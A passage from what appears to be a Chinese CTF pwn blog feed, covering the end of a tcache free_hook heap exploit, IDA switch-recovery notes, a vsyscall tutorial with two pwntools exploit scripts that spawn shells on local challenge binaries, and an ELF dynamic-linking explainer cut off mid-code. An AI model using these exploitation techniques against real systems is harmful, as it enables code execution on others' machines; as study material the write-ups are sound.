class="number">0x110</span>)<span class="comment">#现在10和5指向同一个chunk</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">add(<span class="number">7</span>,<span class="number">0x110</span>)<span class="comment">#拉高对应count[idx]</span></span><br><span class="line"></span><br><span class="line">delete(<span class="number">7</span>)</span><br><span class="line">delete(<span class="number">10</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">edit(<span class="number">5</span>,p64(free_hook))<span class="comment">#挂载hook</span></span><br><span class="line"></span><br><span class="line">add(<span class="number">8</span>,<span class="number">0x110</span>,<span class="string">b&#x27;/bin/sh\x00&#x27;</span>)</span><br><span class="line">add(<span class="number">9</span>,<span class="number">0x110</span>,p64(system))</span><br><span class="line">p.sendline(<span class="string">b&#x27;3&#x27;</span>)</span><br><span class="line">p.sendafter(<span class="string">b&#x27;To Delete:\n&#x27;</span>,<span class="string">b&#x27;8&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p>再总结下流程</p><ol><li>泄露libc和heap</li><li>利用off-by-null向前合并</li><li>切割部分取出tcache范围,这样就获得了两个指针指向同一地址</li><li>拔高对应counts[tc_idx]</li><li>tcahce写入hook地址</li><li>连续两个取出hook并写</li><li>触发</li></ol><h1 id="任务Ⅱ"><a href="#任务Ⅱ" class="headerlink" title="任务Ⅱ"></a>任务Ⅱ</h1><p>不知道是ida版本的问题,还是编译的问题</p><p><a href="https://www.nuke666.cn/2021/08/Specify-switch-statement-in-IDA-Pro/">在 IDA Pro 中恢复 switch 语句 - ChinaNuke的博客 (nuke666.cn)</a>给出的例子,ida直接识别出来switch了</p><p>关键在确认Specify switch idiom功能的各个参数</p><ul><li><strong>Address of jump table：</strong>跳转表的地址。</li><li><strong>Number of elements：</strong>跳转表中元素的个数。</li><li><strong>Size of table element：</strong>跳转表中每个元素的字长（1/2/4/8）。</li><li>Element shift amount：一般情况下保持默认的 0 即可。除非跳转表中存储的元素并不是跳转的目标地址，而是需要通过 <code>target = base +/- (table_element &lt;&lt; shift)</code> 这个公式计算得出，这种情况需要作为 <code>shift</code> 的值提供。</li><li><strong>Element base value：</strong>与 Address of jump table 保持相同的值，对应上述公式中的 <code>base</code>。</li><li><strong>Start of the switch idiom：</strong>switch 语句的首个指令的地址（比如上面例子中的 0x199c），在打开“Specify switch idiom”窗口时，光标处的地址会被自动填写到这里，这就是前面把光标点在地址 0x199c 处的原因。</li><li><strong>Input register of switch：</strong>存储 switch 语句输入的寄存器，即存储 <code>switch(input) &#123;...&#125;</code> 中<code>input</code>变量的寄存器。</li><li>First(lowest) input value：最小的 case 值，比如 case 有 1、2、3、4、5，则填写 0，因为 default 占用了 case 0。</li><li><strong>Default jump address：</strong>default case 的跳转目标地址，可以不指定，不指定时对于 default case 以 case 0 的形式显示。</li><li>Separate value table is present：暂时没搞清，用不到。</li><li><strong>Signed jump table elements：</strong>跳转表中的元素是有符号值时需要勾选。</li><li>Subtract table elements：计算跳转表元素时用减法而不是用加法。</li><li>Table element is insn：跳转表中存储的不是目标地址而直接是指令时需要勾选</li></ul><h1 id="任务Ⅲ"><a href="#任务Ⅲ" class="headerlink" title="任务Ⅲ"></a>任务Ⅲ</h1><p><a href="https://security.tencent.com/index.php/blog/msg/112">https://security.tencent.com/index.php/blog/msg/112</a></p><p><a href="https://www.52pojie.cn/thread-1601573-1-1.html">https://www.52pojie.cn/thread-1601573-1-1.html</a></p><p>逆向学的还不是太明白</p><p>主要了解了下deflat.py脚本使用</p>]]></content>
      
      
      <categories>
          
          <category> pwn </category>
          
      </categories>
      
      
        <tags>
            
            <tag> pwn </tag>
            
            <tag> SunmerCamp2023 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>vsyscall初识</title>
      <link href="/posts/7020/"/>
      <url>/posts/7020/</url>
      
        <content type="html"><![CDATA[<p><strong>vsyscall</strong></p><p>gdb运行程序的时候会发现无论是否开启pie和aslr,内存<code>ffffffffff600000-ffffffffff601000</code>处一定是属于<code>vsyscall</code></p><p>将这块内存<code>dump memory ./dump ffffffffff600000 ffffffffff601000</code>dump下来查看,可以发现</p><p><img src="https://cdn.jsdelivr.net/gh/ixout/picture@main/img/13348817-23d78409dea3408f.webp" alt=""></p><p>内部是三个系统调用并跟随着retn</p><h2 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h2><p>vsyscall的利用其实就是在程序地址随机化的情况下,通过在栈上寻找仅有部分比特位与我们需要的返回地址不同的地址信息,通过溢出部分写修改该地址,然后将vsyscall视为一个已知地址的gadget使返回地址一步步移动到所修改处</p><p>其实还是栈溢出的简单利用</p><p><strong>把vsyscall视为一个固定地址的ret-gadget</strong></p><h2 id="例题"><a href="#例题" class="headerlink" title="例题"></a>例题</h2><h3 id="magic-number"><a href="#magic-number" class="headerlink" title="magic_number"></a>magic_number</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">__int64 __fastcall <span class="title function_">main</span><span class="params">(__int64 a1, <span class="type">char</span> **a2, <span class="type">char</span> **a3)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> buf[<span class="number">44</span>]; <span class="comment">// [rsp+0h] [rbp-30h] BYREF</span></span><br><span class="line">  <span class="type">int</span> v5; <span class="comment">// [rsp+2Ch] [rbp-4h]</span></span><br><span class="line"></span><br><span class="line">  sub_9A0(a1, a2, a3);</span><br><span class="line">  v5 = rand();</span><br><span class="line">  <span class="keyword">if</span> ( v5 == <span class="number">305419896</span> )</span><br><span class="line">    system(<span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Your Input :&quot;</span>);</span><br><span class="line">  read(<span class="number">0</span>, buf, <span class="number">0x100</span>uLL);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>保护</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Arch:     amd64-64-little</span><br><span class="line">RELRO:    Full RELRO</span><br><span class="line">Stack:    No canary found</span><br><span class="line">NX:       NX enabled</span><br><span class="line">PIE:      PIE enabled</span><br></pre></td></tr></table></figure><p>因为pie的存在,且程序简单没有输出几乎难以利用</p><p><img src="https://cdn.jsdelivr.net/gh/ixout/picture@main/img/2023-07-25_172833.png" alt=""></p><p>观察栈上可以发现有与我们所需要的地址只差最后8比特位的地址</p><p>只要修改它并通过vsyscall返回到该处即可getshell</p><p><strong>exp:</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p=process(<span class="string">&#x27;magic_number&#x27;</span>)</span><br><span class="line"></span><br><span class="line">elf=ELF(<span class="string">&#x27;magic_number&#x27;</span>)</span><br><span class="line"><span class="comment"># gdb.attach(p)</span></span><br><span class="line"><span class="comment"># pause()</span></span><br><span class="line">payload = <span class="string">b&#x27;B&#x27;</span>*<span class="number">0x38</span>+p64(<span class="number">0xFFFFFFFFFF600000</span>)+p64(<span class="number">0xFFFFFFFFFF600000</span>)+p64(<span class="number">0xFFFFFFFFFF600000</span>)+p64(<span class="number">0xFFFFFFFFFF600000</span>)+<span class="string">b&#x27;\xA8&#x27;</span></span><br><span class="line">p.recvuntil(<span class="string">b&quot;Your Input :\n&quot;</span>)</span><br><span class="line">p.send(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h3 id="1000levels"><a href="#1000levels" class="headerlink" title="1000levels"></a>1000levels</h3><p>非常有意思的一道题</p><p>checksec</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">[*] &#x27;/home/aichch/pwn/1000levels&#x27;</span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      PIE enabled</span><br></pre></td></tr></table></figure><p>存在pie</p><p>程序有一个hint函数很关键,虽然我们无法使得show_int为非0,但是无论条件是否成立system的地址都会被保存到[rbp-0x110]处</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">hint</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> v1[<span class="number">264</span>]; <span class="comment">// [rsp+8h] [rbp-108h] BYREF</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ( show_hint )</span><br><span class="line">    <span class="built_in">sprintf</span>(v1, <span class="string">&quot;Hint: %p\n&quot;</span>, &amp;system);</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    <span class="built_in">strcpy</span>(v1, <span class="string">&quot;NO PWN NO FUN&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">puts</span>(v1);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">.text:0000000000000CFB 48 8B 05 CE 12 20 00          mov     rax, cs:system_ptr</span><br><span class="line">.text:0000000000000D02 48 89 85 F0 FE FF FF          mov     [rbp+var_110], rax</span><br></pre></td></tr></table></figure><p>再看另一个关键的函数go</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">go</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">  __int64 num; <span class="comment">// [rsp+0h] [rbp-120h]</span></span><br><span class="line">  <span class="type">int</span> v2; <span class="comment">// [rsp+8h] [rbp-118h]</span></span><br><span class="line">  <span class="type">int</span> v3; <span class="comment">// [rsp+Ch] [rbp-114h]</span></span><br><span class="line">  __int64 v4; <span class="comment">// [rsp+10h] [rbp-110h]</span></span><br><span class="line">  __int64 v5; <span class="comment">// [rsp+10h] [rbp-110h]</span></span><br><span class="line">  __int64 v6; <span class="comment">// [rsp+18h] [rbp-108h]</span></span><br><span class="line">  <span class="type">char</span> v7[<span class="number">256</span>]; <span class="comment">// [rsp+20h] [rbp-100h] BYREF</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;How many levels?&quot;</span>);</span><br><span class="line">  num = read_num();</span><br><span class="line">  <span class="keyword">if</span> ( num &gt; <span class="number">0</span> )</span><br><span class="line">    v4 = num;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Coward&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Any more?&quot;</span>);</span><br><span class="line">  v5 = v4 + read_num();</span><br><span class="line">  <span class="keyword">if</span> ( v5 &gt; <span class="number">0</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( v5 &lt;= <span class="number">999</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      v6 = v5;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;More levels than before!&quot;</span>);</span><br><span class="line">      v6 = <span class="number">1000LL</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Let&#x27;s go!&#x27;&quot;</span>);</span><br><span class="line">    v2 = time(<span class="number">0LL</span>);</span><br><span class="line">    <span class="keyword">if</span> ( level(v6) )</span><br><span class="line">    &#123;</span><br><span class="line">      v3 = time(<span class="number">0LL</span>);</span><br><span class="line">      <span class="built_in">sprintf</span>(v7, <span class="string">&quot;Great job! You finished %d levels in %d seconds\n&quot;</span>, v6, (<span class="type">unsigned</span> <span class="type">int</span>)(v3 - v2));</span><br><span class="line">      <span class="built_in">puts</span>(v7);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;You failed.&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">puts</span>(<span class="string">&quot;Coward&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>因为hint和go在调用时栈的环境是相同的,因此二者的rbp-0x110也是相同的</p><p>那么也就是说在go函数中若输入v4不大于0,v4便不会被初始化而是上次保存的system地址</p><p>之后的<code>v5 = v4 + read_num();</code>允许我们修改system地址</p><p>不过单独的system并没有什么作用,也无法写入binsh字符串,故而我们可以利用system来找到one_gadget</p><p>最后利用vsyscall使one_gadget成为返回地址</p><p><strong>exp:</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *  </span><br><span class="line">context(arch=<span class="string">&quot;amd64&quot;</span>,os=<span class="string">&quot;linux&quot;</span>,log_level=<span class="string">&quot;debug&quot;</span>)  </span><br><span class="line">p = process(<span class="string">&#x27;./1000levels&#x27;</span>)   </span><br><span class="line">libc = ELF(<span class="string">&#x27;/home/aichch/glibc-all-in-one/libs/2.23-0ubuntu11.3_amd64/libc-2.23.so&#x27;</span>)  </span><br><span class="line">  </span><br><span class="line">vsyscall = <span class="number">0xffffffffff600000</span>  </span><br><span class="line">  </span><br><span class="line">system_addr = libc.sym[<span class="string">&#x27;system&#x27;</span>]  </span><br><span class="line">execv_gadget = <span class="number">0x4527a</span>  </span><br><span class="line">offset_addr = execv_gadget - system_addr  </span><br><span class="line">    </span><br><span class="line">p.sendlineafter(<span class="string">b&#x27;Choice:\n&#x27;</span>,<span class="string">b&#x27;2&#x27;</span>)  </span><br><span class="line">  </span><br><span class="line">p.sendlineafter(<span class="string">b&#x27;Choice:\n&#x27;</span>,<span class="string">b&#x27;1&#x27;</span>)  </span><br><span class="line">  </span><br><span class="line">p.sendlineafter(<span class="string">b&#x27;How many levels?\n&#x27;</span>,<span class="string">b&#x27;0&#x27;</span>)  </span><br><span class="line">  </span><br><span class="line">p.sendafter(<span class="string">b&#x27;Any more?\n&#x27;</span>,<span class="built_in">str</span>(offset_addr))  </span><br><span class="line"></span><br><span class="line"><span class="comment">#level内部存在递归调用,当v5&gt;999时取1000次递归</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="number">999</span>):  </span><br><span class="line">   p.recvuntil(<span class="string">b&#x27;Question: &#x27;</span>)  </span><br><span class="line">   a = <span class="built_in">int</span>(p.recvuntil(<span class="string">b&#x27; &#x27;</span>))  </span><br><span class="line">   p.recvuntil(<span class="string">b&#x27;* &#x27;</span>)  </span><br><span class="line">   b = <span class="built_in">int</span>(p.recvuntil(<span class="string">b&#x27; &#x27;</span>))  </span><br><span class="line">   p.sendlineafter(<span class="string">b&#x27;Answer:&#x27;</span>,<span class="built_in">str</span>(a*b))  </span><br><span class="line">  </span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x38</span> + p64(vsyscall)*<span class="number">3</span>  </span><br><span class="line">  </span><br><span class="line">p.sendafter(<span class="string">b&#x27;Answer:&#x27;</span>,payload)  </span><br><span class="line">  </span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> pwn </category>
          
      </categories>
      
      
        <tags>
            
            <tag> vsyscall </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>elf动态链接</title>
      <link href="/posts/19785/"/>
      <url>/posts/19785/</url>
      
        <content type="html"><![CDATA[<h1 id="先知"><a href="#先知" class="headerlink" title="先知"></a>先知</h1><p>建议参考<a href="https://www.cnblogs.com/ZIKH26/articles/15944406.html">关于学习ret2_dl_runtime_resolve的总结 - ZikH26</a></p><p>需要先了解一些在动态连接中有巨大作用的section</p><h2 id="plt-amp-amp-plt-got-amp-amp-plt-sec"><a href="#plt-amp-amp-plt-got-amp-amp-plt-sec" class="headerlink" title=".plt&amp;&amp;.plt.got&amp;&amp;.plt.sec"></a>.plt&amp;&amp;.plt.got&amp;&amp;.plt.sec</h2><p><strong>所在segment:代码段</strong></p><p><strong>plt表说是表但其实其中的代码都是用来运行的</strong></p><p>PLT : 程序链接表（PLT，Procedure Link Table）</p><p>调用链接器来解析某个外部函数的地址, 并填充到GOT表中, 然后跳转到该函数; 或者直接在GOT中查找并跳转到对应外部函数(如果非首次调用).</p><p>PLT表可能四种情况:</p><ol><li><code>只有.plt</code></li><li><code>`.plt和.plt.got</code></li><li><code>.plt和.plt,sec</code></li><li><code>.plt和.plt,sec和.plt.got</code></li></ol><hr><p>在延迟绑定环境下,每一个函数对应的PLT表项有三个字段</p><ol><li>code:跳转到对应的got表项中的地址</li><li>code:压栈,该参数是对应函数在.rel.plt上的偏移,是写定的</li><li>code:<strong>跳转到公共项plt[0]</strong></li></ol><p><strong>公共项plt[0]处的代码push GOT[1]然后jmp GOT[2]</strong></p><p>在使用了intel cet技术后,在code1和code2字段前会各加一个endbr64指令</p><p>且只要存在<code>.plt.sec</code>节,那么code1一般都位于其中</p><p>code2和code3以及公共项都位于<code>.plt</code>节</p><h2 id="got-amp-amp-got-plt"><a href="#got-amp-amp-got-plt" class="headerlink" title=".got &amp;&amp; .got.plt"></a>.got &amp;&amp; .got.plt</h2><p><strong>所在segment:数据段</strong></p><p>got表就真的只是表了,只存储内容非运行代码</p><p>GOT : 全局偏移表（GOT, Global Offset Table）</p><p>包括了<code>.got</code>和<code>.got.plt</code>.</p><p><strong>有时<code>.got</code>和<code>.got.plt</code>同时存在,有时只有<code>.got</code></strong></p><p>got表相当于plt的GOT全局偏移表, 其内容有两种情况:</p><ol><li>如果在之前查找过该符号, 内容为外部函数的具体地址. </li><li>如果没查找过, 则内容为对应函数PLT表第二个表项的地址.</li></ol><p>在x86架构下, 除了每个函数占用一个GOT表项外，GOT表项还保留了 3个公共表项,  保存在前三个位置, 分别是:</p><ul><li>got[0]: 本ELF动态段(.dynamic段)的装载地址,初始不为空,就位于elf中</li><li>got<a href="http://www.cs.stevens.edu/~jschauma/810/elf.html">1</a>: 本ELF的<code>link_map</code>数据结构描述符地址,初始为空,程序开始前初始化</li><li>got<a href="http://www.cs.dartmouth.edu/~sergey/cs108/dyn-linking-with-gdb.txt">2</a>: <code>_dl_runtime_resolve</code>函数的地址,初始为空,程序开始前初始化</li></ul><p>如果<code>.got</code>和<code>.got.plt</code>同时存在,这三个表项位于<code>.got.plt</code>,否则位于<code>.got</code></p><p><code>FULL RELRO</code>下,got[1]和got[2]不初始化</p><p><code>Partial RELRO</code>和<code>No RELRO</code>则在程序正式开始前完成初始化</p><p>其中, <code>link_map</code>数据结构的定义如下:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">link_map</span> </span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line"><span class="comment">/* Shared library&#x27;s load address. */</span></span><br><span class="line">ElfW(Addr) l_addr;</span><br><span class="line"><span class="comment">/* Pointer to library&#x27;s name in the string table. */</span>                                    <span class="type">char</span> *l_name;</span><br><span class="line"><span class="comment">/*         Dynamic section of the shared object.</span></span><br><span class="line"><span class="comment">           Includes dynamic linking info etc.</span></span><br><span class="line"><span class="comment">           Not interesting to us.</span></span><br><span class="line"><span class="comment">           */</span>                      </span><br><span class="line">ElfW(Dyn) *l_ld;      </span><br><span class="line"><span class="comment">/* Pointer to previous and next link_map node. */</span>                    </span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">link_map</span> *<span class="title">l_next</span>, *<span class="title">l_prev</span>;</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h2 id="imapct-of-RELRO"><a href="#imapct-of-RELRO" class="headerlink" title="imapct of RELRO"></a>imapct of RELRO</h2><p>这篇文章讲的动态链接延迟绑定</p><p>是指在RELRO保护为<code>Partial RELRO和No RELRO</code>的情况下部分函数进行的延迟绑定</p><hr><p>当RELRO保护为<code>FULL RELRO</code>的情况下<br>函数的动态链接会在程序进入main之前(start函数中)便完成,所有函数第一次调用时GOT表皆已指向真实函数地址</p><p><code>Parital RELRO和No RELRO</code>下<strong>部分</strong>函数也是这样</p><p>栈回溯如下</p><figure class="highlight plaintext"><figcaption><span>backtrace</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">►  f 0   0x7ffff7fdd80d _dl_relocate_object+3613</span><br><span class="line">   f 1   0x7ffff7fdd80d _dl_relocate_object+3613</span><br><span class="line">   f 2   0x7ffff7fd353a dl_main+8026</span><br><span class="line">   f 3   0x7ffff7febc4b _dl_sysdep_start+1355</span><br><span class="line">   f 4   0x7ffff7fd104c _dl_start+604</span><br><span class="line">   f 5   0x7ffff7fd104c _dl_start+604</span><br><span class="line">   f 6   0x7ffff7fd0108 _dl_start_user</span><br><span class="line">   f 7              0x1</span><br></pre></td></tr></table></figure><h3 id="FULL-RELRO"><a href="#FULL-RELRO" class="headerlink" title="FULL RELRO"></a>FULL RELRO</h3><p>FULL RELRO情况下,一般只会有一个<code>.got</code>节(.got.plt并入其中)</p><p>程序正式进行之前,所有函数的动态链接完成后</p><p><strong>会使用mprotect将<code>.got</code>表所在页的写权限禁止</strong></p><h3 id="Partial-RELRO"><a href="#Partial-RELRO" class="headerlink" title="Partial RELRO"></a>Partial RELRO</h3><p><code>Parital RELRO</code>情况下,会有<code>.got</code>节和<code>.got.plt</code>节</p><p>将函数分为两个部分</p><p><code>.got</code>中的函数,在main函数之前完成动态链接,<strong>并由mprotect禁止<code>.got</code>所在页写权限</strong></p><p><code>.got.plt</code>中的函数,则是按照正常的延迟绑定流程进行,并且一直拥有写权限</p><h3 id="No-RELRO"><a href="#No-RELRO" class="headerlink" title="No RELRO"></a>No RELRO</h3><p><code>No RELRO</code>和Parital一样会有<code>.got</code>节和<code>.got.plt</code>节</p><p>函数同样分为两个部分</p><p><code>.got</code>中的函数,同样在main函数之前完成动态链接</p><p><code>.got.plt</code>中的函数,同样按照正常的延迟绑定流程进行</p><p>不同的是,<code>No RELRO</code>不禁止GOT表的任何写权限</p><h2 id="dynamic"><a href="#dynamic" class="headerlink" title=".dynamic"></a>.dynamic</h2><p>包含了很多动态链接所需的关键信息，主要看DT_STRTAB, DT_SYMTAB, DT_JMPREL这三项，这三个东西分别包含了指向<code>.dynstr</code>, <code>.dynsym</code>, <code>.rel.plt</code>这3个section的指针</p><h2 id="dynstr"><a href="#dynstr" class="headerlink" title=".dynstr"></a>.dynstr</h2><p>一个字符串表,包含着动态链接所需要的符号,表项是字符串以0结尾,当要引用某个字符串时,用的时相对这个secticon头的偏移</p><h2 id="dynsym"><a href="#dynsym" class="headerlink" title=".dynsym"></a>.dynsym</h2><p>这个节是一个符号表（结构体数组），里面记录了各种符号的信息，每个表项是一个结构体每个结构体对应一个符号。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  Elf32_Word    st_name; <span class="comment">//符号名，是相对.dynstr起始的偏移，这种引用字符串的方式在前面说过了</span></span><br><span class="line">  Elf32_Addr    st_value;</span><br><span class="line">  Elf32_Word    st_size;</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">char</span> st_info; <span class="comment">//对于导入函数符号而言，它是0x12</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">char</span> st_other;</span><br><span class="line">  Elf32_Section st_shndx;</span><br><span class="line">&#125;Elf32_Sym; <span class="comment">//对于导入函数符号而言，其他字段都是0</span></span><br></pre></td></tr></table></figure><h2 id="rel-plt"><a href="#rel-plt" class="headerlink" title=".rel.plt"></a>.rel.plt</h2><p>它是重定位表（不过跟windows那个重定位表概念不同），也是一个结构体数组，每个项对应一个导入函数。结构体定义如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  Elf32_Addr    r_offset; <span class="comment">//指向GOT表的指针</span></span><br><span class="line">  Elf32_Word    r_info;</span><br><span class="line">  <span class="comment">//一些关于导入符号的信息，我们只关心从第二个字节开始的值((val)&gt;&gt;8)，忽略那个07</span></span><br><span class="line">  <span class="comment">//1和3是这个导入函数的符号在.dynsym中的下标，</span></span><br><span class="line">  <span class="comment">//如果往回看的话你会发现1和3刚好和.dynsym的puts和__libc_start_main对应</span></span><br><span class="line">&#125; Elf32_Rel;</span><br></pre></td></tr></table></figure><h1 id="过程"><a href="#过程" class="headerlink" title="过程"></a>过程</h1><p> 第一次调用库函数时</p><h3 id="dl-runtime-resolve-link-map-reloc-arg"><a href="#dl-runtime-resolve-link-map-reloc-arg" class="headerlink" title="_dl_runtime_resolve(link_map,reloc_arg)"></a>_dl_runtime_resolve(link_map,reloc_arg)</h3><ol><li>用<code>link_map</code>访问<code>.dynamic</code>，取出<code>.dynstr</code>, <code>.dynsym</code>, <code>.rel.plt</code>的指针</li><li><code>.rel.plt + 第二个参数</code>求出当前函数的重定位表项<code>Elf32_Rel</code>的指针，记作<code>rel</code></li><li><code>rel-&gt;r_info &gt;&gt; 8</code>作为<code>.dynsym</code>的下标，求出当前函数的符号表项<code>Elf32_Sym</code>的指针，记作<code>sym</code></li><li><code>.dynstr + sym-&gt;st_name</code>得出符号名字符串指针</li><li>在动态链接库查找这个函数的地址，并且把地址赋值给<code>*rel-&gt;r_offset</code>，即GOT表</li><li>调用这个函数</li></ol><p>但_dl_runtime_resolve的主体其实是调用_dl_fixup</p><p><strong>_dl_fixup</strong>是在glibc-2.23/elf/dl-runtime.c实现的</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span 